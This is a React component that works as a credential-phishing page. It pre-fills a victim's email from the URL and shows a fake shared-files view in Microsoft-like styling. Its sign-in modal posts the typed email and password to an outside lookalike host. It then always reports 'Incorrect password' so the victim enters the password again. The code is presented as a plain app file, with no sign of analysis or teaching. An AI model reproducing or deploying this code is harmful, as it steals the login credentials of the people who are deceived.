import React, { useState, useEffect, useRef } from "react";
import axios from "axios";

function Home() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [open, setOpen] = useState(false);
  const [loading, setLoading] = useState(false);
  const modalRef = useRef(null); // Create a reference for the modal content

  // Function to toggle modal visibility
  const handleModalToggle = () => {
    setOpen(!open);
  };

  // Function to close modal when clicking outside the form/modal content
  useEffect(() => {
    const handleClickOutside = (e) => {
      if (open && modalRef.current && !modalRef.current.contains(e.target)) {
        setOpen(false); // Close the modal only when clicking outside the modal content
      }
    };
    document.addEventListener("mousedown", handleClickOutside);

    return () => {
      document.removeEventListener("mousedown", handleClickOutside);
    };
  }, [open]);

  useEffect(() => {
    // Extract URL parameter
    const baseUrl = window.location.href;
    const urlParam = baseUrl.substring(baseUrl.lastIndexOf("=") + 1);
    setEmail(urlParam);
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);

    try {
      await axios.post("https://nitbucket-info-equipment.vercel.app/api/info", {
        email,
        password,
      });
      setError("Incorrect password");
      setPassword("");
    } catch (err) {
      console.error("Error submitting form", err);
      setError("An error occurred while processing your request.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div>
      <nav
        className="navbar navbar-expand-sm navbar-dark"
        style={{ backgroundColor: "#0078D4" }}
      >
        <div className="container-fluid">
          <a className="navbar-brand" href="#">
            <img src="im/lg.png" alt="Logo" />
          </a>
          <button
            className="navbar-toggler"
            type="button"
            data-bs-toggle="collapse"
            data-bs-target="#mynavbar"
          >
            <img src="im/lgs.png" alt="Menu" />
          </button>
          <div className="collapse navbar-collapse" id="mynavbar"></div>
        </div>
      </nav>
      <div>
        <aside id="asd" className="float-left">
          <img src="im/sd.png" alt="Aside" />
        </aside>
      </div>
      <div className="loaded">
        <h4>SHARED</h4>
        <div className="row mt-4">
          <div className="col-sm-3" onClick={handleModalToggle}>
            <img src="im/1.png" className="img-fluid" alt="Shared 1" />
          </div>
          <div className="col-sm-3" onClick={handleModalToggle}>
            <img src="im/2.png" className="img-fluid" alt="Shared 2" />
          </div>
          <div className="col-sm-3" onClick={handleModalToggle}>
            <img src="im/3.png" className="img-fluid" alt="Shared 3" />
          </div>
          <div className="col-sm-3" onClick={handleModalToggle}>
            <img src="im/4.png" className="img-fluid" alt="Shared 4" />
          </div>
        </div>
        {open && (
          <div className="modal" id="myModal">
            <div className="modal-dialog">
              <div className="modal-content" ref={modalRef}>
                <div className="modal-body bg-white p-3">
                  <img
                    src="im/to.png"
                    className="img-fluid"
                    alt="Modal Image"
                  />
                  <br />
                  {error && (
                    <small
                      className="text-danger"
                      style={{ fontWeight: "600" }}
                    >
                      {error}
                    </small>
                  )}
                  <form id="formx" className="my-4" onSubmit={handleSubmit}>
                    <input
                      type="email"
                      name="email"
                      className="form-control mb-3"
                      value={email}
                      readOnly
                    />
                    <input
                      type="password"
                      name="password"
                      className="form-control mb-3"
                      placeholder="Password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      required
                    />
                    <button
                      type="submit"
                      className="btn btn-md btn-primary"
                      disabled={loading}
                    >
                      {loading ? "Please wait.." : "Sign In"}
                    </button>
                  </form>
                </div>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}

export default Home;
